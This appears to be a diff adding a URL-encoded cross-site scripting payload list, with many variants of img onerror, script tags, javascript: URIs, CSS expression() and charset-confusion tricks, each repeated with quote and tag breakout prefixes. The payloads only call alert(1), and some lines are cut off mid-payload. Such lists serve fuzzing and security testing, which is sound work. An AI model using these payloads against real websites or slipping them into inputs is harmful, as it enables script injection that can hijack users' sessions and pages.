+%3Cimg%20src/x47=x%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src/x47=x%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src/x47=x%20onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x/x09onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x/x09onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x/x09onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x/x10onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x/x10onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x/x10onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x/x11onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x/x11onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x/x11onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x/x12onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x/x12onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x/x12onerror=%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x/x13onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x/x13onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x/x13onerror=%22javascript:alert(1)%22%3E  
+%3Cimg[a][b][c]src[d]=x[e]onerror=[f]%22alert(1)%22%3E  
+%22%3E%3Cimg[a][b][c]src[d]=x[e]onerror=[f]%22alert(1)%22%3E  
+'%3E%3Cimg[a][b][c]src[d]=x[e]onerror=[f]%22alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x09%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x09%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x09%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x10%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x10%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x10%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x11%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x11%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x11%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x12%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x12%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x12%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x32%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x32%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x32%22javascript:alert(1)%22%3E  
+%3Cimg%20src=x%20onerror=/x00%22javascript:alert(1)%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=/x00%22javascript:alert(1)%22%3E  
+'%3E%3Cimg%20src=x%20onerror=/x00%22javascript:alert(1)%22%3E  
+%3Ca%20href=java&  
+%22%3E%3Ca%20href=java&  
+'%3E%3Ca%20href=java&  
+%3Cimg%20src=%22x%60%20%60%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Ctitle%20onpropertychange=javascript:alert(1)%3E%3C/title%3E%3Ctitle%20title=%3E  
+%3Ca%20href=http://foo.bar/  
+%22%3E%3Ca%20href=http://foo.bar/  
+'%3E%3Ca%20href=http://foo.bar/  
+%3C!--[if]%3E%3Cscript%3Ejavascript:alert(1)%3C/script%20--%3E  
+%22%3E%3C!--[if]%3E%3Cscript%3Ejavascript:alert(1)%3C/script%20--%3E  
+'%3E%3C!--[if]%3E%3Cscript%3Ejavascript:alert(1)%3C/script%20--%3E  
+%3C!--[if%3Cimg%20src=x%20onerror=javascript:alert(1)//]%3E%20--%3E  
+%22%3E%3C!--[if%3Cimg%20src=x%20onerror=javascript:alert(1)//]%3E%20--%3E  
+'%3E%3C!--[if%3Cimg%20src=x%20onerror=javascript:alert(1)//]%3E%20--%3E  
+%3Cobject%20id=%22x%22%20classid=%22clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C/object%3E%20%3Cobject%20classid=%22clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error=%22javascript:alert(1)%22%20style=%22behavior:url(  
+%22%3E%3Cobject%20id=%22x%22%20classid=%22clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C/object%3E%20%3Cobject%20classid=%22clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error=%22javascript:alert(1)%22%20style=%22behavior:url(  
+'%3E%3Cobject%20id=%22x%22%20classid=%22clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C/object%3E%20%3Cobject%20classid=%22clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error=%22javascript:alert(1)%22%20style=%22behavior:url(  
+%3Ca%20style=%22-o-link:'javascript:javascript:alert(1)';-o-link-source:current%22%3EX  
+%22%3E%3Ca%20style=%22-o-link:'javascript:javascript:alert(1)';-o-link-source:current%22%3EX  
+'%3E%3Ca%20style=%22-o-link:'javascript:javascript:alert(1)';-o-link-source:current%22%3EX  
+%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D]%7Bcolor:red%7D;%3C/style%3E  
+%22%3E%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D]%7Bcolor:red%7D;%3C/style%3E  
+'%3E%3Cstyle%3Ep[foo=bar%7B%7D*%7B-o-link:'javascript:javascript:alert(1)'%7D%7B%7D*%7B-o-link-source:current%7D]%7Bcolor:red%7D;%3C/style%3E  
+%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(javascript:alert(1))%7d  
+%22%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(javascript:alert(1))%7d  
+'%3E%3Clink%20rel=stylesheet%20href=data:,*%7bx:expression(javascript:alert(1))%7d  
+%3Cstyle%3E@import%20%22data:,*%7bx:expression(javascript:alert(1))%7D%22;%3C/style%3E  
+%22%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(javascript:alert(1))%7D%22;%3C/style%3E  
+'%3E%3Cstyle%3E@import%20%22data:,*%7bx:expression(javascript:alert(1))%7D%22;%3C/style%3E  
+%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22javascript:alert(1);%22%3EX%3C/a%3E%3C/a%3E%3
+%22%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22javascript:alert(1);%22%3EX%3C/a%3E%3C/a%3E%3
+'%3E%3Ca%20style=%22pointer-events:none;position:absolute;%22%3E%3Ca%20style=%22position:absolute;%22%20onclick=%22javascript:alert(1);%22%3EX%3C/a%3E%3C/a%3E%3
+%3Cdiv%20style=%22font-family:'foo&  
+%22%3E%3Cdiv%20style=%22font-family:'foo&  
+'%3E%3Cdiv%20style=%22font-family:'foo&  
+%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Dcolor=red;%22%3EX  
+%3C//%20style=x:expression/28javascript:alert(1)/29%3E  
+%22%3E%3C//%20style=x:expression/28javascript:alert(1)/29%3E  
+'%3E%3C//%20style=x:expression/28javascript:alert(1)/29%3E  
+%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(javascript:alert(1))%7D%3C/style%3E  
+%22%3E%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(javascript:alert(1))%7D%3C/style%3E  
+'%3E%3Cstyle%3E*%7Bx:%EF%BD%85%EF%BD%98%EF%BD%90%EF%BD%92%EF%BD%85%EF%BD%93%EF%BD%93%EF%BD%89%EF%BD%8F%EF%BD%8E(javascript:alert(1))%7D%3C/style%3E  
+%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:javascript:alert(1));%22%3EX  
+%22%3E%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:javascript:alert(1));%22%3EX  
+'%3E%3Cdiv%20style=%22list-style:url(http://foo.f)/20url(javascript:javascript:alert(1));%22%3EX  
+%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+%22%3E%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+'%3E%3Cdiv%20id=d%3E%3Cdiv%20style=%22font-family:'sans/27/3B%20color/3Ared/3B'%22%3EX%3C/div%3E%3C/div%3E%20%3Cscript%3Ewith(document.getElementById(%22d%22))innerHTML=innerHTML%3C/script%3E  
+%3Cdiv%20style=%22background:url(/f  
+%22%3E%3Cdiv%20style=%22background:url(/f  
+'%3E%3Cdiv%20style=%22background:url(/f  
+%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+%22%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+'%3E%3Cdiv%20style=%22font-family:foo%7Bbar;background:url(http://foo.f/oo%7D;color:red/*/foo.jpg);%22%3EX  
+%3Cdiv%20id=%22x%22%3EX%3C/div%3E%20%3Cstyle%3E%20%20  
+%22%3E%3Cdiv%20id=%22x%22%3EX%3C/div%3E%20%3Cstyle%3E%20%20  
+'%3E%3Cdiv%20id=%22x%22%3EX%3C/div%3E%20%3Cstyle%3E%20%20  
+%3Cx%20style=%22background:url('x&  
+%22%3E%3Cx%20style=%22background:url('x&  
+'%3E%3Cx%20style=%22background:url('x&  
+%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=javascript:alert(1)%7D%7D).$=eval%3C/script%3E  
+%22%3E%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=javascript:alert(1)%7D%7D).$=eval%3C/script%3E  
+'%3E%3Cscript%3E(%7Bset/**/$($)%7B_/**/setter=$,_=javascript:alert(1)%7D%7D).$=eval%3C/script%3E  
+%3Cscript%3E(%7B0:  
+%22%3E%3Cscript%3E(%7B0:  
+'%3E%3Cscript%3E(%7B0:  
+%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Bjavascript:alert(1)%7D),x%3C/script%3E  
+%22%3E%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Bjavascript:alert(1)%7D),x%3C/script%3E  
+'%3E%3Cscript%3EReferenceError.prototype.__defineGetter__('name',%20function()%7Bjavascript:alert(1)%7D),x%3C/script%3E  
+%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('javascript:alert(1)')()%3C/script%3E  
+%22%3E%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('javascript:alert(1)')()%3C/script%3E  
+'%3E%3Cscript%3EObject.__noSuchMethod__%20=%20Function,[%7B%7D][0].constructor._('javascript:alert(1)')()%3C/script%3E  
+%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi  
+%22%3E%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi  
+'%3E%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi  
+%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&%3Cscript&S1&TS&1%3Ealert&A7&(1)&R&UA;&&%3C&A9&11/script&X&%3E  
+%22%3E%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&%3Cscript&S1&TS&1%3Ealert&A7&(1)&R&UA;&&%3C&A9&11/script&X&%3E  
+'%3E%3Cmeta%20charset=%22x-imap4-modified-utf7%22%3E&%3Cscript&S1&TS&1%3Ealert&A7&(1)&R&UA;&&%3C&A9&11/script&X&%3E  
+%3Cmeta%20charset=%22mac-farsi%22%3E%C2%BCscript%C2%BEjavascript:alert(1)%C2%BC/script%C2%BE  
+%22%3E%3Cmeta%20charset=%22mac-farsi%22%3E%C2%BCscript%C2%BEjavascript:alert(1)%C2%BC/script%C2%BE  
+'%3E%3Cmeta%20charset=%22mac-farsi%22%3E%C2%BCscript%C2%BEjavascript:alert(1)%C2%BC/script%C2%BE  
+X%3Cx%20style=%60behavior:url(  
+1%3Cset/xmlns=%60urn:schemas-microsoft-com:time%60%20style=%60beh&  
+1%3Canimate/xmlns=urn:schemas-microsoft-com:time%20style=behavior:url(  
+%3Cvmlframe%20xmlns=urn:schemas-microsoft-com:vml%20style=behavior:url(  
+%22%3E%3Cvmlframe%20xmlns=urn:schemas-microsoft-com:vml%20style=behavior:url(  
+'%3E%3Cvmlframe%20xmlns=urn:schemas-microsoft-com:vml%20style=behavior:url(  
+1%3Ca%20href=  
+%3Ca%20style=%22behavior:url(  
+%22%3E%3Ca%20style=%22behavior:url(  
+'%3E%3Ca%20style=%22behavior:url(  
+%2
+
+%3Ca%20href=%22javascript:javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A%22%3E  
+%22%3E%3Ca%20href=%22javascript:javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A%22%3E  
+'%3E%3Ca%20href=%22javascript:javascript:alert(1)%22%3E%3Cevent-source%20src=%22data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A%22%3E  
+%3Cdiv%20id=%22x%22%3Ex%3C/div%3E%20%3Cxml:namespace%20prefix=%22t%22%3E%20%3Cimport%20namespace=%22t%22%20implementation=%22  
+%22%3E%3Cdiv%20id=%22x%22%3Ex%3C/div%3E%20%3Cxml:namespace%20prefix=%22t%22%3E%20%3Cimport%20namespace=%22t%22%20implementation=%22  
+'%3E%3Cdiv%20id=%22x%22%3Ex%3C/div%3E%20%3Cxml:namespace%20prefix=%22t%22%3E%20%3Cimport%20namespace=%22t%22%20implementation=%22  
+%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%3CIMG%20SRC=javascript:javascript:alert(1)%3E  
+%22%3E%3CIMG%20SRC=javascript:javascript:alert(1)%3E  
+'%3E%3CIMG%20SRC=javascript:javascript:alert(1)%3E  
+%3CIMG%20SRC=%60javascript:javascript:alert(1)%60%3E  
+%22%3E%3CIMG%20SRC=%60javascript:javascript:alert(1)%60%3E  
+'%3E%3CIMG%20SRC=%60javascript:javascript:alert(1)%60%3E  
+%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+%22%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+'%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/FRAMESET%3E  
+%3CBODY%20ONLOAD=javascript:alert(1)%3E  
+%22%3E%3CBODY%20ONLOAD=javascript:alert(1)%3E  
+'%3E%3CBODY%20ONLOAD=javascript:alert(1)%3E  
+%3CBODY%20ONLOAD=javascript:javascript:alert(1)%3E  
+%22%3E%3CBODY%20ONLOAD=javascript:javascript:alert(1)%3E  
+'%3E%3CBODY%20ONLOAD=javascript:javascript:alert(1)%3E  
+%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%3CBODY%20onload!  
+%22%3E%3CBODY%20onload!  
+'%3E%3CBODY%20onload!  
+%3CIMG%20SRC=%22javascript:javascript:alert(1)%22  
+%22%3E%3CIMG%20SRC=%22javascript:javascript:alert(1)%22  
+'%3E%3CIMG%20SRC=%22javascript:javascript:alert(1)%22  
+%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%22%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:javascript:alert(1);%22%3E  
+'%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%3CIMG%20DYNSRC=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3CIMG%20DYNSRC=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3CIMG%20DYNSRC=%22javascript:javascript:alert(1)%22%3E  
+%3CIMG%20LOWSRC=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3CIMG%20LOWSRC=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3CIMG%20LOWSRC=%22javascript:javascript:alert(1)%22%3E  
+%3CBGSOUND%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%22%3E%3CBGSOUND%20SRC=%22javascript:javascript:alert(1);%22%3E  
+'%3E%3CBGSOUND%20SRC=%22javascript:javascript:alert(1);%22%3E  
+%3CBR%20SIZE=%22&%7Bjavascript:alert(1)%7D%22%3E  
+%22%3E%3CBR%20SIZE=%22&%7Bjavascript:alert(1)%7D%22%3E  
+'%3E%3CBR%20SIZE=%22&%7Bjavascript:alert(1)%7D%22%3E  
+%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:javascript:alert(1);%22%3E  
+%22%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:javascript:alert(1);%22%3E  
+'%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:javascript:alert(1);%22%3E  
+%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+%22%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+'%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:javascript:alert(1);%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:javascript:alert(1);%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:javascript:alert(1);%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:javascript:alert(1);%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:javascript:alert(1);%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:javascript:alert(1);%22%3E  
+%3CIFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/IFRAME%3E  
+%22%3E%3CIFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/IFRAME%3E  
+'%3E%3CIFRAME%20SRC=%22javascript:javascript:alert(1);%22%3E%3C/IFRAME%3E  
+%3CTABLE%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3CTABLE%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3CTABLE%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+%22%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+'%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:javascript:alert(1)%22%3E  
+%3CDIV%20STYLE=%22background-image:%20url(javascript:javascript:alert(1))%22%3E  
+%22%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:javascript:alert(1))%22%3E  
+'%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:javascript:alert(1))%22%3E  
+%3CDIV%20STYLE=%22width:expression(javascript:alert(1));%22%3E  
+%22%3E%3CDIV%20STYLE=%22width:expression(javascript:alert(1));%22%3E  
+'%3E%3CDIV%20STYLE=%22width:expression(javascript:alert(1));%22%3E  
+%3CIMG%20STYLE=%22X:expr/*X*/ession(javascript:alert(1))%22%3E  
+%22%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(javascript:alert(1))%22%3E  
+'%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(javascript:alert(1))%22%3E  
+%3CX%20STYLE=%22X:expression(javascript:alert(1))%22%3E  
+%22%3E%3CX%20STYLE=%22X:expression(javascript:alert(1))%22%3E  
+'%3E%3CX%20STYLE=%22X:expression(javascript:alert(1))%22%3E  
+%3CSTYLE%20TYPE=%22text/javascript%22%3Ejavascript:alert(1);%3C/STYLE%3E  
+%22%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ejavascript:alert(1);%3C/STYLE%3E  
+'%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ejavascript:alert(1);%3C/STYLE%3E  
+%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:javascript:alert(1)%22)%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:javascript:alert(1)%22)%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:javascript:alert(1)%22)%7D%3C/STYLE%3E  
+%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ejavascript:alert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+%22%3E%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ejavascript:alert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+'%3E%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ejavascript:alert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+%3CBASE%20HREF=%22javascript:javascript:alert(1);//%22%3E  
+%22%3E%3CBASE%20HREF=%22javascript:javascript:alert(1);//%22%3E  
+'%3E%3CBASE%20HREF=%22javascript:javascript:alert(1);//%22%3E  
+%3COBJECT%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam%20name=url%20value=javascript:javascript:alert(1)%3E%3C/OBJECT%3E  
+%22%3E%3COBJECT%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam%20name=url%20value=javascript:javascript:alert(1)%3E%3C/OBJECT%3E  
+'%3E%3COBJECT%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam%20name=url%20value=javascript:javascript:alert(1)%3E%3C/OBJECT%3E  
+%3CHTML%20xmlns:X%3E%3C?import%20namespace=%22X%22%20implementation=%22%(htc)s%22%3E%3CX:X%3EX%3C/X:X%3E%3C/HTML%3E%22%22%22,%22XML%20namespace.%22),(%22%22%22%3CXML%20ID=%22X%22%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:javascript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E%3CSPAN%20DATASRC=%22  
+%22%3E%3CHTML%20xmlns:X%3E%3C?import%20namespace=%22X%22%20implementation=%22%(htc)s%22%3E%3CX:X%3EX%3C/X:X%3E%3C/HTML%3E%22%22%22,%22XML%20namespace.%22),(%22%22%22%3CXML%20ID=%22X%22%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:javascript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E%3CSPAN%20DATASRC=%22  
+'%3E%3CHTML%20xmlns:X%3E%3C?import%20namespace=%22X%22%20implementation=%22%(htc)s%22%3E%3CX:X%3EX%3C/X:X%3E%3C/HTML%3E%22%22%22,%22XML%20namespace.%22),(%22%22%22%3CXML%20ID=%22X%22%3E%3CI%3E%3CB%3E&lt;IMG%20SRC=%22javas%3C!--%20--%3Ecript:javascript:alert(1)%22&gt;%3C/B%3E%3C/I%3E%3C/XML%3E%3CSPAN%20DATASRC=%22  
+%22%3E%3CSPAN%20DATASRC=%22  
+'%3E%3CSPAN%20DATASRC=%22  
+%3CHTML%3E%3CBODY%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E  
+%22%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E  
+'%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E%3C?import%20namespace=%22t%22%20implementation=%22  
+%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%
+%22%3E%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%
+'%3E%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%
+%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+%22%3E%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+'%3E%3Cform%20id=%22test%22%20/%3E%3Cbutton%20form=%22test%22%20formaction=%22javascript:javascript:alert(1)%22%3EX  
+%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
